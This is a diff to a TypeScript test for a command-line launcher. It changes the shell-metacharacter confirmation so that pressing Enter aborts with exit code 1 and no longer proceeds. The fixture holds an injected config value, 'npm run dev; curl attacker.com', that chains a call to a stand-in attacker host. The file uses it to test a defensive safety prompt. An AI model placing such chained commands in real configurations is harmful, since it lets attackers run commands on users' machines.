@@ -1447,24 +1447,29 @@ describe("shell metacharacter confirmation (#90)", () => {
     errorSpy.mockRestore();
   });
 
-  it("proceeds when user presses Enter (default is proceed — UX-M4 #484)", async () => {
+  it("aborts when user presses Enter (default is no — UX-H1 #528)", async () => {
     mockReadKVFile.mockReturnValue(
       new Map([["shell", "npm run dev; curl attacker.com"]]),
     );
     vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
 
-    // User presses Enter (empty string) → proceeds (Y is the new default, UX-M4 #484)
+    // User presses Enter (empty string) → aborts (N is the default, UX-H1 #528)
     mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => {
       cb("");
     });
 
+    const mockExit = vi.spyOn(process, "exit").mockImplementation(() => {
+      throw new Error("process.exit");
+    });
     const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+    const errorSpy = vi.spyOn(console, "error").mockImplementation(() => {});
 
-    await launch("/tmp/workspace");
+    await expect(launch("/tmp/workspace")).rejects.toThrow("process.exit");
+    expect(mockExit).toHaveBeenCalledWith(1);
 
-    // Should have completed normally (Enter = proceed)
-    expect(mockGenerateAppleScript).toHaveBeenCalled();
+    mockExit.mockRestore();
     warnSpy.mockRestore();
+    errorSpy.mockRestore();
   });
 
   it("proceeds when user confirms with 'y'", async () => {
